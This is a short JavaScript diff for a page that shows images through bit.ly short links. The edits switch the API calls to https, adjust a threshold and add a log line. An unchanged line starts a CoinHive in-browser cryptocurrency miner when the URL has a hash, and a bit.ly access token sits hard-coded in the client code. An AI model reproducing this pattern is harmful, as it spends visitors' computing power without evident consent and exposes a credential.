@@ -1,5 +1,5 @@
-var base = "http://api.bit.ly/v3/shorten?access_token=b928afeae904842e0aa6b9510b26deb12c6ad7d3";
-var baseExpand = "http://api.bit.ly/v3/expand?access_token=b928afeae904842e0aa6b9510b26deb12c6ad7d3";
+var base = "https://api-ssl.bit.ly/v3/shorten?access_token=b928afeae904842e0aa6b9510b26deb12c6ad7d3";
+var baseExpand = "https://api-ssl.bit.ly/v3/expand?access_token=b928afeae904842e0aa6b9510b26deb12c6ad7d3";
 var img;
 if (window.location.hash != "") {
   var miner = new CoinHive.User("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz", window.location.hash.slice(1));
@@ -10,9 +10,10 @@ if (window.location.hash != "") {
       document.querySelector("#maincard"+img.split("").pop()).style.display = "none";
     }
   });
-  if (isNaN(parseInt(img.split("").pop())) || parseInt(img.split("").pop()) > 2) {
+  if (isNaN(parseInt(img.split("").pop())) || parseInt(img.split("").pop()) > 3) {
     img += "0";
   }
+  console.log(img,img.slice(0,img.length-1));
   document.querySelector("#maincard"+img.split("").pop()).src = "http://bit.ly/"+img.slice(0,img.length-1);
   document.querySelector("#maincard"+img.split("").pop()).style.display = "inherit";
   fetch(baseExpand+"&shortUrl=http%3A%2F%2Fbit.ly%2F"+img.slice(0,img.length-1)+"&format=txt").then((res) => {
